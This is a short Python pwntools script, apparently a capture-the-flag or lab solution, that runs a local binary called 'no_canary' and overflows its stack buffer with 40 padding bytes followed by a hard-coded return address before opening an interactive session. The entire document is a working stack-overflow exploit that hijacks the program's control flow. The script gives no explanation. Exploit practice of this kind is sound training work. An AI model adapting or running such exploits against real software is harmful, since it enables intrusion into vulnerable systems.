from pwn import *

p = process("./no_canary")
p.sendline("A"*40+"\x86\x11\x40\x00\x00\x00\x00\x00")
p.interactive()
